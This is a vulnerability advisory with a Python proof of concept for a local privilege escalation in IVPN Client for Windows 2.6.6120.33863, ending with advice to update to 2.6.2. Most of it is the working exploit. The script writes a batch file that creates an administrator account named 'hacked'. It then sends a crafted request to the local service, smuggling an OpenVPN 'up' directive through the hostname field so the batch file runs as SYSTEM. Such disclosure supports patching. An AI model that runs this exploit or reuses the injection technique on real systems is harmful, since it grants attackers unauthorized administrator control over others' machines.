# Date: 06.02.2017
# Software Link: https://www.ivpn.net/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: local
  
1. Description
 
It is possible to run `openvpn` as `SYSTEM` with custom openvpn.conf.
 
Using `--up cmd` we can execute any command.
 
https://security.szurek.pl/ivpn-client-for-windows-26612033863-privilege-escalation.html
 
2. Proof of Concept
 
import socket
 
print "IVPN Client for Windows 2.6.6120.33863 Privilege Escalation"
print "by Kacper Szurek"
print "http://security.szurek.pl/"
print "https://twitter.com/KacperSzurek"
 
hostname = "is.gw.ivpn.net 2049"
username = "your_username"
password = "your_password"
 
open(r&#039;c:\\1\\test.bat&#039;, &#039;w&#039;).write(&#039;net user hacked /add\nnet localgroup administrators hacked /add&#039;)
 
port = int(open(r"c:\Program Files\IVPN Client\etc\port.txt").read())
 
a = r&#039;{"$type":"IVPN.OpenVPNServer, IVPN.Core","id":"id","region":"region","country":"country","city":"city","hostnames":{"$type":"System.Collections.Generic.List`1[[System.String, mscorlib]], mscorlib","$values":["&#039;+hostname+r&#039;\r\nup c:\\\\\\\\1\\\\\\\\test.bat\r\nverb"]},"ports":{"$type":"System.Collections.Generic.List`1[[IVPN.OpenVPNServerPort, IVPN.Core]], mscorlib","$values":[{"$type":"IVPN.OpenVPNServerPort, IVPN.Core","protocol":1,"port":2000}]}}&#039;
 
b = r&#039;{"$type":"IVPN.IVPNConnectRequest, IVPN.Core","entryServer":&#039;+a+&#039;,"exitServer":&#039;+a+&#039;,"username":"&#039;+username+&#039;","password":"&#039;+password+&#039;","portProtocol":{"$type":"IVPN.OpenVPNServerPort, IVPN.Core","protocol":1,"port":2000},"proxyType":"sth","proxyAddress":"proxyAddress","proxyPort":100,"proxyUsername":"proxyUsername","proxyPassword":"proxyPassword"}&#039;
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", port))
s.send(b)
 
print "OK"
 
3. Solution
 
Update to version 2.6.2
 
https://www.ivpn.net/setup/windows-changelog.html

